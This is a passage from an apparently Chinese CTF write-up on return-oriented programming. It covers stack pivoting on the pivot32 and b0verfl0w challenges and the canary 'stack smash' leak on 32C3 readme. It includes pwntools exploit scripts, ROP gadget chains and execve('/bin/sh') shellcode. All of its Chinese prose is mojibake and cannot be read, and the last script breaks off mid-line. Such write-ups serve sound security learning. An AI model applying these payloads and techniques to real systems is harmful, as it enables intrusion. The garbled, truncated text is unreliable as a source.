Emporium</a>ï¼Œé€‰æ‹©pivot-x_86</p><p>ç»™çš„å‹ç¼©åŒ…é‡Œè¿˜æœ‰ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ <code>libpivot32.so</code>ï¼Œchecksec ä¸€ä¸‹ç”šè‡³å‡ºç°äº†æ²¡è§è¿‡çš„ç©æ„ <code>RUNPATH:  &#39;.&#39;</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">RUNPATH:</span>  <span class="hljs-string">&#x27;.&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ª  RUNPATH:  â€˜.â€™  çš„æ„æ€æ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„è¿è¡Œæ—¶è·¯å¾„ï¼ˆrun-time search pathï¼‰è®¾ç½®ä¸ºå½“å‰ç›®å½•ï¼ˆâ€™.â€™ï¼‰ï¼Œä¹Ÿå°±æ˜¯å®ƒè¿è¡Œæ—¶ä¼šä½¿ç”¨é¢˜ç›®æ‰€ç»™çš„åŠ¨æ€é“¾æ¥åº“</p></blockquote><p>ç›´æ¥åœ¨linuxé‡Œè¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼Œè¿™ä¸ªç¨‹åºæœ‰æœ‰ä¸¤ä¸ªè¾“å…¥ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-19-28.png"></p><p>åç¼–è¯‘ä¸€ä¸‹è¿™ä¸ªç¨‹åºçš„mainå‡½æ•°ï¼Œå¤åˆ¶ä¸€ä¸‹æºç å†™ä¸ªæ³¨é‡Š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *ptr; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pivot by ROP Emporium&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;x86\n&quot;</span>);<br>  ptr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000000</span>u);  <span class="hljs-comment">//åˆ†é…ä¸€ä¸ª0x1000000uçš„å†…å­˜å—ï¼Œå¹¶å°†å…¶åœ°å€èµ‹å€¼ç»™ptræŒ‡é’ˆ</span><br>  <span class="hljs-keyword">if</span> ( !ptr )  <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Failed to request space for pivot stack&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;  <span class="hljs-comment">//æ£€æŸ¥å†…å­˜åˆ†é…æ˜¯å¦æˆåŠŸï¼Œå¦‚æœå¤±è´¥åˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºç¨‹åºã€‚</span><br>  <span class="hljs-built_in">pwnme</span>(ptr + <span class="hljs-number">16776960</span>);  <span class="hljs-comment">//è°ƒç”¨pwnmeå‡½æ•°ï¼Œå°†ptræŒ‡é’ˆåç§»16776960å­—èŠ‚çš„ä½ç½®ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒã€‚</span><br>  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//é‡Šæ”¾å…ˆå‰åˆ†é…çš„å†…å­˜å—</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nExiting&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°mainå‡½æ•°é‡Œæ²¡æœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨ï¼Œä½†æ˜¯åœ¨<code>pwnme</code>å‡½æ•°é‡Œå‘ç°<code>read()</code>æ²¡æœ‰è¾“å…¥é•¿åº¦çš„éªŒè¯</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-26-26.png"></p><p>å…¶ä¸­åœ¨ç¬¬äºŒä¸ªè¾“å…¥æº¢å‡ºæ—¶ï¼Œåªæœ‰<code>(0x38-0x28-4)</code>å³12ä¸ªå­—èŠ‚çš„ç¼“å†²åŒºå¯ä»¥åˆ©ç”¨ï¼Œæ— æ³•ç›´æ¥åœ¨æ ˆä¸Šæ„é€ ropé“¾ã€‚é¢˜ç›®ä¹Ÿæœ‰æç¤ºï¼Œæˆ‘ä»¬éœ€è¦å°†ropé“¾å­˜åˆ°bufä¸­ï¼Œå†å°†æ ˆè½¬ç§»åˆ°bufä¸Šã€‚</p><p>æˆ‘ä»¬å‘ç°putsä¸€æ¡æ–‡æœ¬<code>Call ret2win() from libpivot</code>ï¼Œæ²¡æœ‰åœ¨è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸­å‘ç°è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯é¢˜ç›®è¿˜ç»™äº†ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ <code>libpivot32.so</code>ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¨‹åºè·³è½¬åˆ°è¿™é‡Œæ‰§è¡Œä¸ºæˆ‘ä»¬æ‰“å¼€flagã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-26_10-33-31.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ç¨‹åºæ‰§è¡Œåˆ°æˆ‘ä»¬å¡«å…¥çš„<code>leave;ret</code>æŒ‡ä»¤ä¹‹å‰ï¼Œè‡ªå·±ä¹Ÿæ‰§è¡Œäº†ä¸€æ¬¡è¯¥æŒ‡ä»¤ã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæŒ‡ä»¤è¢«æ‰§è¡Œäº†ä¸¤æ¬¡</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-04_15-45-03.png"></p><p>ç”±äºæ¯æ¬¡retéƒ½ä¼šä½¿å¾—esp+4ï¼Œæ‰€ä»¥ï¼Œä¼ªé€ çš„ebpçš„åœ°å€è¦å‡å»4ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./pivot32&quot;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pivot32&#x27;</span>)<br>lib_elf=ELF(<span class="hljs-string">&#x27;./libpivot32.so&#x27;</span>)<br><br>func_plt=elf.plt[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>func_got_plt=elf.got[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>foothold_sym=lib_elf.symbols[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>ret2win_sym=lib_elf.symbols[<span class="hljs-string">&#x27;ret2win&#x27;</span>]<br>offset=<span class="hljs-built_in">int</span>(ret2win_sym-foothold_sym)<br><br>leave_ret=<span class="hljs-number">0x080486a8</span><br>mov_eax_eax=<span class="hljs-number">0x080488c4</span><br>pop_eax=<span class="hljs-number">0x080488c0</span><br>pop_ebx=<span class="hljs-number">0x08048571</span><br>add_eax_ebx=<span class="hljs-number">0x080488c7</span><br>call_eax=<span class="hljs-number">0x080486a3</span><br><br>p.recvuntil(<span class="hljs-string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)<br>fake_ebp=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><br>payload1=p32(func_plt)+p32(pop_eax)+p32(func_got_plt)+p32(mov_eax_eax)+p32(pop_ebx)+p32(offset)+p32(add_eax_ebx)+p32(call_eax)<br><br><span class="hljs-comment">#è¿™é‡Œéœ€è¦å…ˆè°ƒç”¨ä¸€æ¬¡foothold_functionï¼Œå°†å®ƒçš„åœ°å€åŠ è½½åˆ°got.pltä¸­ï¼Œæˆ‘ä»¬æ‰èƒ½è¿›è¡Œåç»­çš„æ›¿æ¢</span><br><span class="hljs-comment">#payloadå«ä¹‰ä¸ºï¼Œå°†eaxèµ‹å€¼ä¸ºfoothold_functionçš„çœŸå®åœ°å€ï¼Œå†å°†ebxèµ‹å€¼ä¸ºfoothold_functionå’Œret2winçš„åç§»ï¼Œæœ€åå°†ebxåŠ åˆ°eaxä¸Šï¼Œè°ƒç”¨ret2win</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload1)<br><br>payload2=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">40</span>+p32(fake_ebp-<span class="hljs-number">4</span>)+p32(leave_ret)<br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload2)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="ğŸŒ°-2"><a href="#ğŸŒ°-2" class="headerlink" title="ğŸŒ°_2:"></a>ğŸŒ°_2:</h4><p> [X-CTF Quals 2016 - b0verfl0w](<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w) </p><p>é¢˜ç›®æ‹¿åˆ°æ‰‹å…ˆæŸ¥çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-27-21.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹æºç å‘ç°vulå‡½æ•°æœ‰æ ˆæº¢å‡ºæ¼æ´</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-39-53.png"></p><p>ä½†æ˜¯å¯æ§åˆ¶çš„èŒƒå›´å¾ˆå°åªæœ‰50-32-4&#x3D;14ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°±è€ƒè™‘ stack pivoting ã€‚ç”±äºç¨‹åºæœ¬èº«å¹¶æ²¡æœ‰å¼€å¯å †æ ˆä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸Šå¸ƒç½® shellcode å¹¶æ‰§è¡Œã€‚</p><p>æ„é€ å®Œshellcodeä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å¯¹ esp è¿›è¡Œæ“ä½œï¼Œä½¿å…¶æŒ‡å‘ shellcode å¤„ï¼Œå¹¶ä¸”ç›´æ¥æ§åˆ¶ç¨‹åºè·³è½¬è‡³ esp å¤„ã€‚</p><p>æŸ¥æ‰¾ä¸€ä¸‹å¯ä»¥åˆ©ç”¨çš„gadget</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-46-47.png"></p><p>å…¶ä¸­<code>0x08048504</code>æœ‰ç›´æ¥è·³è½¬åˆ°espçš„ç‰‡æ®µï¼Œ</p><p>ä¿®æ”¹æ ˆä¸Šçš„è¿”å›åœ°å€ä¸º<code>jmp esp</code>çš„åœ°å€ï¼Œè¿™æ ·ç¨‹åºå°±ä¼šè·³è½¬åˆ°æ ˆé¡¶æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€å¤„æ‰§è¡Œpayloadã€‚</p><p>æ„é€ ç»“æ„å¦‚ä¸‹ï¼š</p><p>shellcode+padding&#x3D;0x20ï¼Œfake ebp&#x3D;0x4ï¼Œjmp_esp&#x3D;0x4</p><p>ä¸ºäº†ä¿è¯æ ˆä¸Šæœ‰è¶³å¤Ÿçš„ç©ºé—´æ‰§è¡Œpayloadï¼Œæˆ‘ä»¬èƒ½å°†æ ˆæŒ‡é’ˆå‘ä¸‹è°ƒæ•´ï¼Œå³sub esp, 0x28;jmp espã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./b0verfl0w&#x27;</span>)<br><br>jum_esp=<span class="hljs-number">0x08048504</span><br><br>Shellcode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br>Payload=Shellcode+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(jum_esp)+asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br><br><span class="hljs-comment">#å…ˆåˆ©ç”¨sub esp, 0x28;jmp espæŒ‡ä»¤è·³è½¬åˆ°è°ƒæ•´åçš„æ ˆé¡¶ï¼Œå†å‘ä¸Šé¢å†™å…¥shellcodeï¼Œæœ€åå†æ¬¡æ‰§è¡Œjum_espè·³è½¬æ‰§è¡Œshellcode  </span><br><br>r.sendline(Payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><p>canaryä¿æŠ¤æœ‰å¤šç§ç»•è¿‡æ–¹å¼ï¼Œå…¶ä¸­Stack smashå°±æ˜¯ç»•è¿‡canaryä¿æŠ¤çš„ä¸€ç§æ–¹å¼ã€‚ä¹‹å‰åšè¿‡çš„canaryä¿æŠ¤ç»•è¿‡æ˜¯å¡«å……canaryæœ€åçš„å­—èŠ‚å¹¶ä¹‹åæš´åŠ›æšä¸¾æˆ–æ˜¯ç›´æ¥æ³„éœ²ï¼Œä»è€Œé¿å…canaryä¿æŠ¤ç¨‹åºæŠ¥é”™ã€‚Stack smashè¿™ä¸ªæ–¹æ³•å¹¶ä¸åœ¨ä¹æ˜¯å¦ä¼šå¼•å‘canaryæŠ¥é”™ï¼Œè€Œæ˜¯åˆ©ç”¨æŠ¥é”™çš„å†…å®¹ã€‚</p><p>åœ¨ç¨‹åºå¯åŠ¨canaryä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç°canaryè¢«ä¿®æ”¹çš„è¯å°±ä¼šæ‰§è¡Œ <code>_stack_chk_fail</code> å‡½æ•°æ¥æ‰“å° argv[0] æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘ç¨‹åºåã€‚å¦‚æœæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›– argv[0] ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„å­—ç¬¦ä¸²åœ°å€ï¼Œé‚£ä¹ˆåœ¨ <code>_fortify_fail</code> å‡½æ•°ä¸­å°±ä¼šè¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚</p><blockquote><p>è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºglibc-2.31ä»¥å‰çš„ç¨‹åºï¼Œä¹‹åçš„ç¨‹åºä¸ä¼šæ‰“å° argv[0] æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥2015å¹´32C3 CTF readme ä¸ºä¾‹</p><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200">2015 32C3 CTF readme</a></p><p>è§¦å‘canaryä¿æŠ¤åç¨‹åºä¼šè¾“å‡ºä¸€æ®µæŠ¥é”™  </p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_16-51-08.png"></p><p>å¼€å§‹è§£é¢˜ï¼Œåæ±‡ç¼–ä¸€ä¸‹æºç ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-14-00.png"></p><p>ç¨‹åºä¸­æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥èµ‹å€¼ç»™v3åä¸å¯¹å…¶è¿›è¡Œä»»ä½•æ“ä½œï¼›ç¬¬äºŒæ¬¡è¾“å…¥èµ‹å€¼ç»™v1ï¼Œå°†å…¶ä¸æ–­èµ‹å€¼ç»™byte_600D20è¿™ä¸ªæ•°ç»„ã€‚</p><p>åŒå‡»æŸ¥çœ‹æ•°ç»„</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-16-59.png"></p><p>ä¹Ÿå°±æ˜¯è¯´è¿™é“é¢˜æˆ‘ä»¬åªéœ€è¦æ‹¿flagè€Œä¸æ˜¯æ‹¿shellï¼Œè€Œä¸”v2å˜é‡æ¥æ”¶ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¼šä¸æ–­è¦†ç›–åŸæœ‰çš„flagå†…å®¹ã€‚</p><p>åœ¨è¿™ä¹‹åè¿˜æœ‰ä¸€æ¡è¯­å¥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">int</span>)v0 + <span class="hljs-number">6294816LL</span>), <span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">32</span> - v0));<br></code></pre></td></tr></table></figure><p> è¿™æ¡ä¼ªä»£ç çš„åŸå‹æ˜¯è¿™æ ·çš„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">int</span> value, <span class="hljs-type">size_t</span> num)</span></span>;<br></code></pre></td></tr></table></figure><p>æ„æ€æ˜¯ä»å†…å­˜æŒ‡é’ˆptræŒ‡å‘çš„ä½ç½®ç›´åˆ°å‘ånumå­—èŠ‚éƒ½è¢«valueå–ä»£ã€‚</p><p>ç»“åˆ <code>byte_600D20[v0++] = v1;</code> ï¼Œæˆ‘ä»¬é¢˜ç›®ä¸­çš„å‡½æ•°æ„æ€å°±æ˜¯æ— è®ºä½ æ˜¯å¦è¿›è¡Œç¬¬äºŒæ¬¡è¾“å…¥ï¼Œåœ¨ç¨‹åºç»“æŸå flag çš„ä½ç½®éƒ½å°†è¢«æ›¿æ¢ï¼Œæˆ‘ä»¬å°±æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ argv[0] çš„å€¼è·å¾— flag ã€‚</p><p>ä½†æ˜¯flagè¢«æ˜ å°„äº†ä¸¤æ¬¡ï¼Œ0x600D21ä¸­çš„flagè¢«ä¿®æ”¹ï¼Œé‚£æˆ‘ä»¬å°±æŠŠ argv[0] æŒ‡å‘ 0x400d21ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_16-02-26.png"></p><blockquote><p>çœ‹äº†å¾ˆå¤šå¤§ä½¬çš„è§£æä¹Ÿæ²¡ææ˜ç™½ï¼Œç¨‹åºä¸­æœ‰ä¸¤ä¸ªloadæ®µï¼Œä¸ºä»€ä¹ˆç¬¬äºŒä¸ªloadæ®µä¸­çš„flagï¼Œä¼šè¢«æ˜ å°„åˆ°ç¬¬ä¸€ä¸ªload æ®µé‡ŒğŸ¥²</p></blockquote><p>æŸ¥æ‰¾argv[0]çš„ä½ç½®ï¼Œä¸€å…±æ‰¾åˆ°ä¸‰ç§æ–¹æ³•ï¼š</p><ul><li>æ–¹æ³•ä¸€ï¼š</li></ul><p>ç”¨pedaæŒ‚è½½æ–‡ä»¶ï¼Œå…ˆåœ¨ç¬¬ä¸€ä¸ªgetså¤„ä¸‹æ–­ç‚¹</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-37-25.png"></p><p>åˆ©ç”¨findå‘½ä»¤æŸ¥æ‰¾ä¸æ–‡ä»¶åæœ‰å…³çš„åœ°å€ï¼Œå†è®¡ç®—å½“å‰çš„rspæŒ‡é’ˆä¸å…¶çš„è·ç¦»</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-42-28.png"></p><ul><li>æ–¹æ³•äºŒ</li></ul><p>ä¹Ÿæ˜¯åˆ©ç”¨argv[0]æŒ‡å‘ç¨‹åºåçš„ç‰¹ç‚¹å¯»æ‰¾ï¼Œç›´æ¥ä¸‹æ–­ç‚¹ï¼ŒæŸ¥æ‰¾æŒ‡å‘ç¨‹åºåçš„å†…å­˜æŒ‡é’ˆã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-46-20.png"></p><ul><li>æ–¹æ³•ä¸‰</li></ul><p>ç”¨å‘½ä»¤<code>p &amp; __libc_argv[0]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gdb">&gt; p &amp; __libc_argv[0]<br>$1 = (char **) 0x7fffffffdff8<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦å†™å…¥536ä¸ªå­—èŠ‚ä¹Ÿå°±æ˜¯0x218ä¸ªå­—èŠ‚æ‰èƒ½å°†argv[0]è¦†ç›–æ‰ï¼Œæ‰€ä»¥payloadæ„æˆåº”è¯¥æ˜¯0x218å­—èŠ‚çš„å¡«å……ç‰©åŠ ä¸Šæˆ‘ä»¬ç›®æ ‡flagçš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(<span class="hljs-number">0x400d20</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Please overwrite the flag:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;Modifier&#x27;</span>)<br><br><span class="hljs-built_in">print</span> p.recv()<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡æœ‰è¾“å‡ºï¼Œæ˜¯å› ä¸ºç¨‹åºæŠŠé”™è¯¯ä¿¡å·å‘é€ç»™äº†æ‰§è¡Œç¨‹åºçš„ç»ˆç«¯é‡Œï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç¯å¢ƒå˜é‡è®©é”™è¯¯ä¿¡æ¯é€šè¿‡ç½‘ç»œä¼ åˆ°æˆ‘ä»¬çš„ç»ˆç«¯é‡Œã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦åˆ©ç”¨ç¬¬äºŒæ¬¡çš„è¾“å…¥ï¼Œå°† <code>LIBC_FATAL_STDERR_=1</code> å†™å…¥åˆ°ç¯å¢ƒå˜é‡ä¸­ã€‚åœ¨ç¬¬ä¸€ä¸ªpayloadå½“ä¸­æˆ‘ä»¬å·²ç»æŠŠæŒ‡é’ˆæŒ‡å‘äº†argv[0]ï¼Œéœ€è¦å°†æŒ‡é’ˆå†æ¬¡æŒ‡å‘ç¬¬äºŒæ¬¡è¾“å…¥ç‚¹ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)</span><br><br><span class="hljs-variable">payload_1</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x218</span> + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x400d20</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span 